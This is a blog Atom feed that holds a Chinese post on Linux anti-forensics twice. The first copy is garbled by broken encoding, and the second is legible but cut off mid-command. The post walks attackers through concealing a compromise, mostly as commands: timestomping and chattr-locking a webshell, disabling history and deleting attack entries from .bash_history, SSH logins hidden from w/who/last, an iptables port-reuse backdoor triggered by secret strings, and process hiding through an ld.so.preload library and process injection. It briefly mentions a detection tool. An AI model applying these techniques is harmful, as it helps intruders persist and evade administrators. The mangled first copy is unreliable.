<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Eviden🥝</title>
  
  
  <link href="https://github.com/Eviden0/new-webpage/atom.xml" rel="self"/>
  
  <link href="https://github.com/Eviden0/new-webpage/"/>
  <updated>2024-06-12T23:33:01.353Z</updated>
  <id>https://github.com/Eviden0/new-webpage/</id>
  
  <author>
    <name>Eviden🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://github.com/Eviden0/new-webpage/posts/0.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/0.html</id>
    <published>2024-06-13T05:51:55.398Z</published>
    <updated>2024-06-12T23:33:01.353Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-j��">0x00 ǰ��</h3><p>�������ڻ�ȡ������Ȩ�޺󣬻�ͨ��һЩ�����������Լ����ټ��ͺ����ļ������Ľ���Linux�µļ������ؼ�����</p><h3 id="0x01-�����l�">0x01 �����ļ�</h3><p>Linux �´���һ�������ļ���<code>touch  .test.txt</code></p><p>touch ������Դ���һ���ļ����ļ���ǰ���һ�� �� �ʹ����������ļ�,����ͼ��</p><p><img src="./image/privilege-2-1.png" alt=""></p><p>һ���Linux�µ�����Ŀ¼ʹ������<code>ls -l</code>�ǲ鿴�������ģ�ֻ�ܲ鿴���ļ����ļ��У��鿴Linux�µ������ļ���Ҫ�õ����<code>ls -al</code></p><p>������ǿ��Կ�����/tmp�£�Ĭ�ϴ��ڶ������Ŀ¼����ЩĿ¼�Ƕ����ļ������������ĵط�����<code>/temp/.ICE-unix/��/temp/.Test-unix/��/temp/.X11-unix/��/temp/.XIM-unix/</code></p><h3 id="0x02-�����l�ʱ���">0x02 �����ļ�ʱ���</h3><p>Unix �²غ��ű���Ҫ�޸�ʱ�䣬��������ױ����֣�ֱ������ touch �Ϳ����ˡ�</p><p>����ο� index.php ��ʱ�䣬�ٸ��� webshell.php����������ļ���ʱ���һ���ˡ�</p><p>���÷���</p><p>touch -r index.php webshell.php</p><p>����ֱ�ӽ�ʱ����޸ĳ�ĳ��ĳ��ĳ�ա����� 2014 �� 01 �� 02 �ա�</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-����E��">0x03 ����Ȩ��</h3><p>��Linux�У�ʹ��chattr��������ֹroot�����������û���ɾ�����޸���Ҫ�ļ���Ŀ¼����Ȩ����ls -l�ǲ鿴�������ģ��Ӷ��ﵽ����Ȩ�޵�Ŀ�ġ�</p><p>������ɳ������ں��ţ������һЩ��������ĺ����ļ�����ܶ��������Ѹе�ͷ�ۡ�</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> �����ļ�</span><br><span class="line">lsattr  evil<span class="selector-class">.php</span>   ���Բ鿴</span><br><span class="line">chattr -<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> �������</span><br><span class="line">rm -rf <span class="number">1</span><span class="selector-class">.evil</span><span class="selector-class">.php</span>  ɾ���ļ�</span><br></pre></td></tr></table></figure><p><img src="./image/privilege-2-2.png" alt=""></p><h3 id="0x04-������ʷ��������">0x04 ������ʷ��������</h3><p>��shell��ִ�е������ϣ������¼����������ʷ�У������linux�п����޺۲���ģʽ�أ�</p><p>����һ��ֻ�����Ĺ����ر���ʷ��¼</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="literal">space</span>]<span class="keyword">set</span> +o history</span><br><span class="line">��ע��[<span class="literal">space</span>] ��ʾ�ո񡣲������ڿո��Ե�ʣ��������Ҳ���ᱻ��¼��</span><br></pre></td></tr></table></figure><p>������������ʱ������ʷ���ܣ�����ζ����������֮����ִ�е����в����������¼����ʷ�У�Ȼ���������֮ǰ�����ж�������ԭ����¼����ʷ�б��С�</p><p>Ҫ���¿�����ʷ���ܣ�ִ����������</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]<span class="built_in">set</span> -o <span class="built_in">history</span></span><br><span class="line">���������ָ�ԭ״��Ҳ�������������Ĺ�����ִ����������֮���������������ʷ�С�</span><br></pre></td></tr></table></figure><p>���ɶ�������ʷ��¼��ɾ��ָ��������</p><p>������ʷ��¼���Ѿ�������һЩ�㲻ϣ����¼��������������������ô�죿�ܼ򵥡�ͨ�������������ɾ����</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">history</span> | <span class="keyword">grep</span> <span class="string">&quot;keyword&quot;</span></span><br></pre></td></tr></table></figure><p>�����ʷ��¼��ƥ������ÿһ��ǰ����и����֡�����ʷ��¼��ɾ���Ǹ�ָ�����</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">history</span> -d<span class="meta"> [num]</span></span><br></pre></td></tr></table></figure><p><img src="./image/privilege-2-3.png" alt=""></p><p>���ּ����ǹؼ���¼ɾ�����������ǿ��Ա����㣬����ǰ150�����û�������������¼��150�Ժ��ǹ����߲�����¼�����ǿ���ֻ���������Ĳ�����ɾ�������ۼ�����ʷ������¼���������ֻ����ǰ150�У�</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sed</span> -i <span class="string">&#x27;150,<span class="variable">$d</span>&#x27;</span> .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-����Զ��SSH��½��¼">0x05 ����Զ��SSH��½��¼</h3><p>#������¼ϵͳ�����ᱻw��who��last��ָ���⵽��</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T root@<span class="number">127.0.0.1</span> /bin/bash -i</span><br></pre></td></tr></table></figure><p>����¼ssh��Կ�ڱ���.sshĿ¼��</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=<span class="regexp">/dev/</span><span class="keyword">null</span> -T user@host <span class="regexp">/bin/</span>bash �Ci</span><br></pre></td></tr></table></figure><h3 id="0x06-�˿ڸ���">0x06 �˿ڸ���</h3><p>ͨ���˿ڸ������ﵽ���ض˿ڵ�Ŀ�ģ���Linux�£����ʵ�ֶ˿ڸ����أ�</p><p>��һ�ַ�ʽ��ͨ��SSLH��ͬһ�˿��Ϲ���SSH��HTTPS</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#��װSSLH</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install sslh</span><br><span class="line"><span class="comment">#����SSLH</span></span><br><span class="line">�༭ SSLH �����ļ���</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1���ҵ������У�<span class="attribute">Run</span>=<span class="literal">no</span>  �����޸�Ϊ��<span class="attribute">Run</span>=<span class="literal">yes</span></span><br><span class="line">2���޸������������� SSLH �����п��ýӿ��������˿� 443</span><br><span class="line"><span class="attribute">DAEMON_OPTS</span>=<span class="string">&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span></span><br></pre></td></tr></table></figure><p>�ڶ��ַ�ʽ������IPTables���ж˿ڸ���</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># �˿ڸ�����</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">N</span> <span class="string">LETMEIN</span></span><br><span class="line"><span class="comment"># �˿ڸ��ù���</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span>  -<span class="string">A</span> <span class="string">LETMEIN</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">j</span> <span class="string">REDIRECT</span> <span class="built_in">--to-port</span> <span class="string">22</span></span><br><span class="line"><span class="comment"># ��������</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathuntercoming&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--set</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># �رտ���</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathunterleaving&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--remove</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># let&#x27;s do it</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">A</span> <span class="string">PREROUTING</span> -<span class="string">p</span> <span class="string">tcp</span> <span class="built_in">--dport</span> <span class="string">80</span> <span class="built_in">--syn</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--rcheck</span> <span class="built_in">--seconds</span> <span class="string">3600</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">LETMEIN</span></span><br></pre></td></tr></table></figure><p>���÷�ʽ��</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#��������</span></span><br><span class="line"><span class="attribute">echo</span> threathuntercoming | socat - tcp:<span class="number">192.168.28.128:80</span></span><br><span class="line"><span class="comment">#sshʹ��80�˿ڽ��е�¼</span></span><br><span class="line"><span class="attribute">ssh</span> -p <span class="number">80</span> root@<span class="number">192.168.28.128</span></span><br><span class="line"><span class="comment">#�رո���</span></span><br><span class="line"><span class="attribute">echo</span> threathunterleaving | socat - tcp:<span class="number">192.168.28.128:80</span></span><br></pre></td></tr></table></figure><p><img src="./image/privilege-2-4.png" alt=""></p><p>�������������<a href="https://www.freebuf.com/articles/network/137683.html">Զ��ң�� IPTables ���ж˿ڸ���</a></p><h3 id="0x07-��������">0x07 ��������</h3><p>����Ա�޷�ͨ���������߲��ҵ������еĽ��̣��Ӷ��ﵽ����Ŀ�ģ�ʵ�ֽ������ء�</p><p>��һ�ַ�����libprocesshider</p><p>github��Ŀ��ַ��https://github.com/gianlucaborello/libprocesshider</p><p>���� LD_PRELOAD ��ʵ��ϵͳ�����Ľٳ֣�ʵ������</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ���س������</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line"><span class="built_in">cd</span> libprocesshider/ &amp;&amp; make</span><br><span class="line"><span class="comment"># �ƶ��ļ���/usr/local/lib/Ŀ¼��</span></span><br><span class="line"><span class="built_in">cp</span> libprocesshider.so /usr/local/lib/</span><br><span class="line"><span class="comment"># �������ص�ȫ�ֶ�̬���Ӿ�</span></span><br><span class="line"><span class="built_in">echo</span> /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>���ԣ����� evil_script.py��</p><p><img src="./image/privilege-2-5.png" alt=""></p><p>��ʱ������top �� ps �ж��޷��ҵ� evil_script.py�� cpu ʹ���ʸ�,����ȴ�Ҳ����κ�ռ��cpu�ߵĳ���</p><p><img src="./image/privilege-2-6.png" alt=""></p><p>�����Linux�з������صĽ��̣�</p><p><code>unhide</code> ��һ��С�ɵ�����ȡ֤���ߣ��ܹ�������Щ����rootkit��LKM�������������صĽ��̺�TCP / UDP�˿ڡ����������Linux��UNIX�࣬MS-Windows�Ȳ���ϵͳ�¶����Թ�����</p><p>���ص�ַ��http://www.unhide-forensics.info/</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ��װ</span></span><br><span class="line">sudo yum <span class="keyword">install</span> unhide</span><br><span class="line"><span class="comment"># ʹ��</span></span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>ʹ��<code>unhide proc</code>�������ؽ���evil_script.py������ͼ��ʾ��</p><p><img src="./image/privilege-2-7.png" alt=""></p><p>�ڶ��ַ���������ע�빤��linux-inject</p><p>linux-inject�����ڽ���������ע��Linux���̵Ĺ���</p><p>github��Ŀ��ַ�� <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ���س������</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gaffe23/linux-inject.git</span><br><span class="line"><span class="built_in">cd</span> linux-inject &amp;&amp; make</span><br><span class="line"><span class="comment"># ���Խ���</span></span><br><span class="line">./sample-target</span><br><span class="line"><span class="comment"># ����ע��</span></span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>��֤����ע��ɹ�������ͼ��ʾ��</p><p><img src="./image/privilege-2-8.png" alt=""></p><p>Cymothoa��һ�����صĺ��Ź��ߡ���ͨ����Ŀ��������Ծ�Ľ���ע�������룬�Ӷ���ȡ��ԭ������ͬ��Ȩ�ޡ��ù��������ŵ���ǲ������µĽ��̣������ױ����֡�</p><p>���ص�ַ��https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ���ؽ�ѹ</span></span><br><span class="line"><span class="attribute">wget</span> https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-<span class="number">1</span>-beta/cymothoa-<span class="number">1</span>-beta.tar.gz</span><br><span class="line"><span class="attribute">tar</span> zxvf cymothoa-<span class="number">1</span>-beta.tar.gz </span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="attribute">cd</span> cymothoa-<span class="number">1</span>-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-����">0x07 ����</h3><p>������Ҫ������Linux�µļ������ؼ��������������ļ�������Ȩ�ޡ�������ʷ��������˿ڸ��á��������صȷ���ļ��ɡ�������ש����֮�ã���ӭ���Է�����</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-j��&quot;&gt;0x00 ǰ��&lt;/h3&gt;
&lt;p&gt;�������ڻ�ȡ������Ȩ�޺󣬻�ͨ��һЩ�����������Լ����ټ��ͺ����ļ������Ľ���Linux�µļ������ؼ�����&lt;/p&gt;
&lt;h3 id=&quot;0x01-�����</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://github.com/Eviden0/new-webpage/posts/0.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/0.html</id>
    <published>2024-06-13T05:33:28.218Z</published>
    <updated>2024-06-13T05:41:18.824Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h3 id="0x01-隐藏文件">0x01 隐藏文件</h3><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code></p><p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-1.png" alt=""></p><p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p><p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p><h3 id="0x02-隐藏文件时间戳">0x02 隐藏文件时间戳</h3><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p><p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p><p>利用方法</p><p>touch -r index.php webshell.php</p><p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p><p>touch -t 1401021042.30 webshell.php</p><h3 id="0x03-隐藏权限">0x03 隐藏权限</h3><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p><p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> 锁定文件</span><br><span class="line">lsattr  evil<span class="selector-class">.php</span>   属性查看</span><br><span class="line">chattr -<span class="selector-tag">i</span> evil<span class="selector-class">.php</span> 解除锁定</span><br><span class="line">rm -rf <span class="number">1</span><span class="selector-class">.evil</span><span class="selector-class">.php</span>  删除文件</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-2.png" alt=""></p><h3 id="0x04-隐藏历史操作命令">0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p><p>技巧一：只针对你的工作关闭历史记录</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="literal">space</span>]<span class="keyword">set</span> +o history</span><br><span class="line">备注：[<span class="literal">space</span>] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure><p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p><p>要重新开启历史功能，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]<span class="built_in">set</span> -o <span class="built_in">history</span></span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>技巧二：从历史记录中删除指定的命令</p><p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">history</span> | <span class="keyword">grep</span> <span class="string">&quot;keyword&quot;</span></span><br></pre></td></tr></table></figure><p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">history</span> -d<span class="meta"> [num]</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-3.png" alt=""></p><p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sed</span> -i <span class="string">&#x27;150,<span class="variable">$d</span>&#x27;</span> .bash_history</span><br></pre></td></tr></table></figure><h3 id="0x05-隐藏远程SSH登陆记录">0x05 隐藏远程SSH登陆记录</h3><p>#隐身登录系统，不会被w、who、last等指令检测到。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -T root@<span class="number">127.0.0.1</span> /bin/bash -i</span><br></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=<span class="regexp">/dev/</span><span class="keyword">null</span> -T user@host <span class="regexp">/bin/</span>bash –i</span><br></pre></td></tr></table></figure><h3 id="0x06-端口复用">0x06 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p><p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装SSLH</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install sslh</span><br><span class="line"><span class="comment">#配置SSLH</span></span><br><span class="line">编辑 SSLH 配置文件：</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1、找到下列行：<span class="attribute">Run</span>=<span class="literal">no</span>  将其修改为：<span class="attribute">Run</span>=<span class="literal">yes</span></span><br><span class="line">2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line"><span class="attribute">DAEMON_OPTS</span>=<span class="string">&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span></span><br></pre></td></tr></table></figure><p>第二种方式：利用IPTables进行端口复用</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口复用链</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">N</span> <span class="string">LETMEIN</span></span><br><span class="line"><span class="comment"># 端口复用规则</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span>  -<span class="string">A</span> <span class="string">LETMEIN</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">j</span> <span class="string">REDIRECT</span> <span class="built_in">--to-port</span> <span class="string">22</span></span><br><span class="line"><span class="comment"># 开启开关</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathuntercoming&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--set</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># 关闭开关</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">A</span> <span class="string">INPUT</span> -<span class="string">p</span> <span class="string">tcp</span> -<span class="string">m</span> <span class="string">string</span> <span class="built_in">--string</span> <span class="string">&#x27;threathunterleaving&#x27;</span> <span class="built_in">--algo</span> <span class="string">bm</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--remove</span> -<span class="string">j</span> <span class="string">ACCEPT</span></span><br><span class="line"><span class="comment"># let&#x27;s do it</span></span><br><span class="line"><span class="string">iptables</span> -<span class="string">t</span> <span class="string">nat</span> -<span class="string">A</span> <span class="string">PREROUTING</span> -<span class="string">p</span> <span class="string">tcp</span> <span class="built_in">--dport</span> <span class="string">80</span> <span class="built_in">--syn</span> -<span class="string">m</span> <span class="string">recent</span> <span class="built_in">--rcheck</span> <span class="built_in">--seconds</span> <span class="string">3600</span> <span class="built_in">--name</span> <span class="string">letmein</span> <span class="built_in">--rsource</span> -<span class="string">j</span> <span class="string">LETMEIN</span></span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启复用</span></span><br><span class="line"><span class="attribute">echo</span> threathuntercoming | socat - tcp:<span class="number">192.168.28.128:80</span></span><br><span class="line"><span class="comment">#ssh使用80端口进行登录</span></span><br><span class="line"><span class="attribute">ssh</span> -p <span class="number">80</span> root@<span class="number">192.168.28.128</span></span><br><span class="line"><span class="comment">#关闭复用</span></span><br><span class="line"><span class="attribute">echo</span> threathunterleaving | socat - tcp:<span class="number">192.168.28.128:80</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-4.png" alt=""></p><p>具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p><h3 id="0x07-进程隐藏">0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p><p>第一种方法：libprocesshider</p><p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p><p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载程序编译</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line"><span class="built_in">cd</span> libprocesshider/ &amp;&amp; make</span><br><span class="line"><span class="comment"># 移动文件到/usr/local/lib/目录下</span></span><br><span class="line"><span class="built_in">cp</span> libprocesshider.so /usr/local/lib/</span><br><span class="line"><span class="comment"># 把它加载到全局动态连接局</span></span><br><span class="line"><span class="built_in">echo</span> /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>测试：运行 evil_script.py，</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-5.png" alt=""></p><p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-6.png" alt=""></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo yum <span class="keyword">install</span> unhide</span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-2-7.png" alt=""></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载程序编译</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gaffe23/linux-inject.git</span><br><span class="line"><span class="built_in">cd</span> linux-inject &amp;&amp; make</span><br><span class="line"><span class="comment"># 